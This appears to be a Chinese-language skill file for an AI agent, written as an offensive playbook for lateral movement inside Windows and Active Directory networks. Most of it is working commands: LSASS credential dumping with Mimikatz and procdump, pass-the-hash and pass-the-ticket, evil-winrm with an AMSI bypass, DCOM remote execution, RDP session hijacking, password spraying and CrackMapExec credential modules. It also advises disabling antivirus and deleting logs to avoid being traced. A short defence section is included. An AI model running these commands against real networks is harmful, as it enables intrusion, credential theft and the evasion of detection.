---
name: pivoting-lateral-movement
description: >-
  Pivoting and lateral movement playbook. Use when utilizing compromised systems as stepping stones to penetrate deeper into internal networks, bypassing network isolation and security controls.
---

# SKILL: 跳板攻击与横向移动实战

## 1. 跳板攻击流程

### 阶段概述
```
初始入侵 → 建立跳板 → 横向移动 → 深入渗透 → 维持访问
```

### 详细步骤

**步骤1：初始入侵**
- 利用漏洞、社交工程或密码攻击获取系统访问权限
- 优先选择边界设备（Web服务器、VPN接入点等）

**步骤2：建立跳板**
- 评估跳板系统的网络位置和访问权限
- 安装必要工具：Mimikatz、Nmap、PsExec等
- 建立隧道或代理：SOCKS代理、端口转发

**步骤3：横向移动**
- 扫描内部网络，发现其他系统和服务
- 利用跳板系统上的凭据访问其他主机
- 寻找易受攻击的系统

**步骤4：深入渗透**
- 权限提升（提权漏洞、凭证窃取）
- 数据泄露、安装后门
- 扩大控制范围

**步骤5：维持访问**
- 在关键系统上安装持久化后门
- 确保即使初始入侵点被关闭仍能访问

## 2. 内网信息搜集

### 探测内网存活主机

**Windows ping扫描**：
```cmd
for /l %i in (1,1,254) do ping -n 1 192.168.2.%i | find "TTL=" >> C:\alive.txt
```

**PowerShell扫描**：
```powershell
1..254 | ForEach-Object { Test-Connection -ComputerName "192.168.2.$_" -Count 1 -Quiet }
```

**Nmap扫描（通过跳板）**：
```bash
proxychains nmap -sn 192.168.2.0/24
```

### 使用Impacket探测内网服务

```bash
# 扫描内网SMB服务
python3 smbscan.py -target 192.168.2.0/24

# 扫描内网LDAP服务
python3 ldapsearch.py -target 192.168.2.0/24

# 扫描内网Kerberos服务
python3 getTGT.py -dc-ip 192.168.2.103 -scan
```

### 抓取账号密码哈希

**Mimikatz**：
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt
```

**获取LSASS内存转储**：
```cmd
procdump -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

### 确认域信息

```cmd
net config workstation          # 查看是否加入域
net domain                      # 查看域名称
nslookup test.com               # 解析域控IP
whoami /all                     # 查看当前用户信息和SID
```

## 3. BloodHound AD拓扑分析

### BloodHound简介
BloodHound是AD信息可视化工具，用于寻找直达域管理员/域控的攻击路径。

### 使用流程

**步骤1：使用SharpHound收集数据**

```powershell
# 基础收集
.\SharpHound.exe -c All

# 静默收集
.\SharpHound.exe -c All -d oa.com --Stealth

# 收集到指定文件
.\SharpHound.exe -c All -o output.json

# 自定义收集选项
.\SharpHound.exe -c DCOnly,User,Group,Computer -d oa.com
```

**步骤2：在BloodHound中分析**

```bash
# 启动BloodHound
bloodhound

# 导入数据
# 在界面中点击"Upload Data"，选择SharpHound生成的JSON文件

# 分析攻击路径
# 使用查询功能：
# - Find all paths to Domain Admins
# - Find all Domain Admins
# - Find all Kerberoastable users
# - Find all AS-REP Roastable users
# - Find all Highly Privileged Users
```

**步骤3：利用分析结果进行攻击**

根据BloodHound分析结果，选择最优攻击路径：
- 如果存在Kerberoastable用户，进行Kerberoasting攻击
- 如果存在AS-REP Roastable用户，进行AS-REP Roasting攻击
- 如果存在直接路径到Domain Admins，利用该路径进行攻击

## 4. 横向移动技术

### 哈希传递攻击（Pass-the-Hash）

**PsExec**：
```cmd
psexec.exe \\192.168.2.102 -u test\admin -p 31d6cfe0d16ae931b73c59d7e0c089c0 -s cmd
```

**Impacket SMBExec**：
```bash
python3 smbexec.py domain/user@target -hashes LM:NTLM
```

**Impacket PsExec**：
```bash
python3 psexec.py domain/user@target -hashes LM:NTLM
```

**条件**：
- 需要NTLM哈希
- 目标开放SMB服务（445端口）
- 目标允许传入SMB连接

### 票据传递攻击（Pass-the-Ticket）

**获取票据**：
```cmd
mimikatz.exe "kerberos::list" "exit"
```

**注入票据**：
```cmd
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"
```

**利用票据**：
```cmd
psexec.exe \\dc.domain.com -s cmd
```

**使用Impacket获取和使用票据**：
```bash
# 获取TGT票据
python3 getTGT.py domain/user -dc-ip 10.10.2.200

# 使用票据执行命令
KRB5CCNAME=user.ccache python3 smbexec.py -k -no-pass domain/target$@10.10.2.200
```

### 端口转发与隧道

**Meterpreter端口转发**：
```cmd
portfwd add -l 3389 -r 192.168.2.103 -p 3389
```

**SSH隧道**：
```bash
ssh -L 1080:192.168.2.0/24:8080 user@jump_host
```

**SOCKS代理（Meterpreter）**：
```cmd
run socks -p 1080
```

**修改proxychains配置**：
```
socks5 127.0.0.1 1080
```

### PowerShell横向移动

**PowerShell远程执行**：
```powershell
Invoke-Command -ComputerName "192.168.2.102" -ScriptBlock { whoami }
```

**WMI远程执行**：
```powershell
Get-WmiObject -Class Win32_OperatingSystem -ComputerName "192.168.2.102"
```

**SMB横向移动**：
```powershell
$session = New-PSSession -ComputerName "192.168.2.102"
Invoke-Command -Session $session -ScriptBlock { Get-Process }
```

### CrackMapExec横向移动

```bash
# 扫描内网SMB服务
crackmapexec smb 192.168.2.0/24 -u admin -p password

# 哈希传递
crackmapexec smb 192.168.2.0/24 -u admin -H hash

# 执行命令
crackmapexec smb 192.168.2.0/24 -u admin -p password -x "whoami"

# 枚举共享
crackmapexec smb 192.168.2.0/24 -u admin -p password --shares
```

## 5. 工具和技术

### 网络扫描工具
- **Nmap**：发现内网中的其他系统和服务
- **Masscan**：快速端口扫描
- **nbtscan**：NetBIOS信息收集

### AD信息收集工具
- **BloodHound**：AD拓扑分析
- **SharpHound**：BloodHound数据收集

### 漏洞利用工具
- **Metasploit**：利用已知漏洞进行攻击
- **Cobalt Strike**：强大的后渗透框架

### 凭据窃取工具
- **Mimikatz**：抓取Windows凭据
- **LaZagne**：多平台凭据窃取

### 横向移动工具
- **PsExec**：远程执行命令
- **Impacket**：SMB/WinRM远程执行（smbexec、wmiexec、psexec）
- **CrackMapExec**：多协议横向移动

### 域渗透专用工具
- **Certipy**：ADCS证书漏洞利用
- **bloodyAD**：AD ACL权限滥用
- **ACLPwn**：ACL自动提权路径

## 6. 安全风险与防御

### 安全风险
- **网络边界被绕过**：跳板攻击能够绕过网络边界控制
- **难以检测**：利用合法系统和协议，攻击难以被检测
- **广泛的影响范围**：攻击者可以访问大量系统和数据

### 防御措施
- **网络隔离和分割**：通过物理和逻辑手段隔离网络
- **强化内部安全**：即使外部防御被突破，内部系统也要强化安全措施
- **异常检测**：使用IDS和SIEM系统监测异常行为
- **多因素认证和权限管理**：强化身份验证，限制访问权限
- **定期安全审计和渗透测试**：定期检查系统漏洞
- **监控Kerberos票据活动**：检测异常票据请求

## 7. 实战建议

### 操作顺序
1. **信息搜集优先**：先了解内网拓扑和资产
2. **BloodHound分析**：使用BloodHound寻找最优攻击路径
3. **凭据优先于漏洞**：利用现有凭据进行横向移动更隐蔽
4. **低调行事**：避免大规模扫描和爆破
5. **清理痕迹**：删除工具和日志，避免被溯源

### 避坑指南
- **关闭杀软**：Windows Defender会查杀Mimikatz等工具
- **网络配置**：确保虚拟机在同一网段，跳板机需要双网卡
- **避免明文密码**：企业内网通常禁止明文密码传输
- **清理痕迹**：测试完成后删除上传的工具和日志

### 完整攻击链路

```
建立跳板
  ├── 安装工具（Mimikatz、Nmap、PsExec）
  ├── 建立SOCKS代理
  └── 配置proxychains

内网搜集
  ├── 存活主机扫描
  ├── 凭据窃取（Mimikatz）
  └── BloodHound拓扑分析

横向移动
  ├── 哈希传递（PsExec/Impacket）
  ├── 票据传递（Pass-the-Ticket）
  ├── CrackMapExec批量扫描
  └── PowerShell/WMI远程执行

域控突破
  ├── 利用BloodHound找到的攻击路径
  ├── 直接漏洞利用
  ├── 票据攻击
  └── ACL权限滥用
```

## 8. [补充推演] evil-winrm横向移动

### WinRM协议利用

**WinRM简介**：Windows Remote Management，基于HTTP(S)的远程管理协议，默认端口5985(HTTP)/5986(HTTPS)。

**evil-winrm使用**：
```bash
# 使用明文密码连接
evil-winrm -i 192.168.2.102 -u admin -p password

# 使用NTLM哈希连接
evil-winrm -i 192.168.2.102 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 使用Kerberos票据连接
export KRB5CCNAME=admin.ccache
evil-winrm -i 192.168.2.102 -r test.com
```

**evil-winrm后渗透功能**：
```ruby
# 上传/下载文件
evil-winrm> upload /path/to/local/file C:\path\to\remote
evil-winrm> download C:\path\to\remote /path/to/local

# 加载PowerShell脚本
evil-winrm> menu
evil-winrm> Bypass-4MSI
evil-winrm> menu
evil-winrm> Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# 加载内存.NET程序集
evil-winrm> /usr/share/SharpHound/SharpHound.exe
evil-winrm> AssemblyLoad Rubeus.exe
evil-winrm> Rubeus.exe kerberoast
```

**WinRM横向移动条件**：
```
- 目标开启WinRM服务（默认Server 2012+开启）
- 目标5985端口可达
- 拥有目标管理员凭据
- 用户未被WinRM远程访问限制
```

## 9. [补充推演] DCOM横向移动

### DCOM简介
分布式组件对象模型（DCOM），允许通过网络远程调用COM对象。攻击者可利用DCOM进行无文件横向移动。

### MMC20.Application

```powershell
# 通过MMC20.Application执行命令
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.2.102"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")
```

### ShellWindows

```powershell
# 通过ShellWindows执行命令
$com = [Type]::GetTypeFromProgID("Shell.Application","192.168.2.102")
$obj = [Activator]::CreateInstance($com)
$obj.Windows() | ForEach-Object { $_.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\","open",0) }
```

### ExcelDDE

```powershell
# 通过Excel DDE执行命令
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.2.102"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

### DCOM横向移动优势

```
1. 无需文件落地目标主机
2. 不创建新进程（利用合法COM对象）
3. 不触发常规PsExec检测规则
4. 通过已有RPC/DCOM通信通道
5. 审计日志较少
```

## 10. [补充推演] RDP相关横向技术

### RDP劫持（RDP Hijacking）

**原理**：利用SYSTEM权限接管已存在的RDP会话，无需密码。

```cmd
# 查看已登录用户
query user

# 以SYSTEM权限接管会话（通过tscon）
tscon <SESSION_ID> /dest:console

# 示例：接管会话ID为2的用户
tscon 2 /dest:console
```

**条件**：
- 需要SYSTEM权限
- 目标有已登录的RDP会话
- 会话处于断开连接状态

### RDP密码抓取

```cmd
# 从注册表获取RDP默认密码（如果启用了凭据委托）
cmdkey /list

# 使用Mimikatz抓取RDP凭据
mimikatz.exe "privilege::debug" "ts::mstsc" "exit"

# 从终端服务缓存中提取
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```

### RDP持久化

```
1. 窃取RDP凭据
2. 记录RDP会话信息
3. 启用Restricted Admin模式（无需密码RDP）
4. 通过Pass-the-Hash进行RDP认证

# 启用Restricted Admin
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# 使用哈希进行RDP登录
xfreerdp /v:192.168.2.103 /u:Administrator /pth:NTLM_HASH
```

## 11. [补充推演] CrackMapExec完整使用指南

### 基础扫描

```bash
# SMB扫描存活主机
crackmapexec smb 192.168.2.0/24

# 枚举域信息
crackmapexec smb 192.168.2.0/24 -d test.com -u admin -p password --users
crackmapexec smb 192.168.2.0/24 -d test.com -u admin -p password --groups
crackmapexec smb 192.168.2.0/24 -d test.com -u admin -p password --computers
crackmapexec smb 192.168.2.0/24 -d test.com -u admin -p password --shares
```

### 密码喷洒

```bash
# 使用密码列表喷洒
crackmapexec smb 192.168.2.0/24 -u users.txt -p passwords.txt

# 使用NTLM哈希喷洒
crackmapexec smb 192.168.2.0/24 -u users.txt -H hashes.txt

# 检测可登录的账户（不锁定）
crackmapexec smb 192.168.2.0/24 -u users.txt -p 'Password123' --continue-on-success
```

### 命令执行

```bash
# 执行系统命令
crackmapexec smb 192.168.2.0/24 -u admin -p password -x "whoami"
crackmapexec smb 192.168.2.0/24 -u admin -p password -x "net user"

# 通过PowerShell执行
crackmapexec smb 192.168.2.0/24 -u admin -p password -X "Get-Process"

# 以SYSTEM权限执行
crackmapexec smb 192.168.2.0/24 -u admin -p password -x "whoami" --exec-method mmcexec
```

### 凭据操作

```bash
# 使用Mimikatz dump凭据（需要本地管理员权限）
crackmapexec smb 192.168.2.0/24 -u admin -p password -M lsassy
crackmapexec smb 192.168.2.0/24 -u admin -p password -M nanodump

# 使用SAM文件导出
crackmapexec smb 192.168.2.0/24 -u admin -p password -M spiders_plus

# 修改NTLM
crackmapexec smb 192.168.2.0/24 -u admin -p password -M ntlmv1 --enable
```

### 其他协议支持

```bash
# WinRM协议
crackmapexec winrm 192.168.2.0/24 -u admin -p password -x "whoami"

# MSSQL协议
crackmapexec mssql 192.168.2.0/24 -u sa -p password -q "SELECT @@version"

# LDAP协议
crackmapexec ldap 192.168.2.0/24 -u admin -p password -M get-network
crackmapexec ldap 192.168.2.0/24 -u admin -p password -M adcs
```

### NetExec（CrackMapExec继任者）

```bash
# NetExec是CrackMapExec的活跃维护版本
# 安装
pip install netexec

# 使用方式与CrackMapExec类似
nxc smb 192.168.2.0/24 -u admin -p password
nxc smb 192.168.2.0/24 -u admin -p password --shares
nxc smb 192.168.2.0/24 -u admin -p password -M lsassy
```

## 12. [补充推演] 横向移动技术对比矩阵

| 技术 | 协议/端口 | 需要凭据 | 隐蔽性 | 检测难度 | 适用场景 |
|---|---|---|---|---|---|
| PsExec | SMB/445 | 明文/Hash | 低 | 低 | 快速获取Shell |
| SMBExec | SMB/445 | 明文/Hash | 低 | 低 | 替代PsExec |
| WMIExec | WMI/135 | 明文/Hash | 中 | 中 | 隐蔽横向 |
| WinRM/evil-winrm | HTTP/5985 | 明文/Hash | 中 | 中 | 现代环境 |
| Pass-the-Hash | SMB/445 | Hash | 中 | 中 | 凭据复用 |
| Pass-the-Ticket | Kerberos/88 | 票据 | 高 | 高 | 域内移动 |
| DCOM | RPC/135 | 明文/Hash | 高 | 高 | 无文件横向 |
| RDP劫持 | RDP/3389 | SYSTEM | 高 | 高 | 会话接管 |
| CrackMapExec | 多协议 | 明文/Hash | 低 | 低 | 批量扫描 |
| DCOM ExcelDDE | RPC/135 | 明文/Hash | 高 | 高 | 隐蔽执行 |
| WMI事件订阅 | RPC/135 | 管理员 | 高 | 高 | 持久化横向 |
| PowerShell Remoting | WinRM/5985 | 明文/Hash | 中 | 中 | 脚本化操作 |

### 横向移动选择决策树

```
已知凭据类型
├── 明文密码
│   ├── 目标开放SMB → PsExec/SMBExec
│   ├── 目标开放WinRM → evil-winrm/PowerShell Remoting
│   ├── 目标开放WMI → WMIExec
│   └── 目标开放RDP → RDP远程桌面
├── NTLM哈希
│   ├── 目标开放SMB → Pass-the-Hash (PsExec/SMBExec)
│   ├── 目标开放WinRM → evil-winrm -H
│   └── 目标开放WMI → WMIExec
├── Kerberos票据
│   ├── 域内任意服务 → Pass-the-Ticket
│   ├── 目标开放SMB → Impacket + Kerberos
│   └── 目标开放WinRM → evil-winrm + Kerberos
├── 仅SYSTEM权限
│   ├── 有已登录会话 → RDP劫持
│   ├── SMB Beacon → CS内SMB横向
│   └── DCOM → 无凭据横向
└── 无凭据
    ├── 可利用漏洞 → MS17-010等漏洞利用
    ├── 可接收文件 → 投递木马
    └── 配置错误 → 利用错误配置
```

## 13. [补充推演] 跨Skill协作关系

| 场景 | 本Skill提供 | 衔接Skill |
|---|---|---|
| C2通道建立 | SMB Beacon、隧道技术 | c2-remote-control |
| 域内横向移动 | Pass-the-Ticket、委派利用 | domain-penetration |
| 内网信息搜集 | BloodHound分析、CrackMapExec扫描 | internal-penetration |
| 凭据获取后的批量操作 | CrackMapExec密码喷洒 | domain-penetration |
| 横向移动检测与取证 | 横向移动技术特征、检测点 | traceback-counterattack |
| 持久化与C2通道 | 隧道建立、代理配置 | c2-remote-control |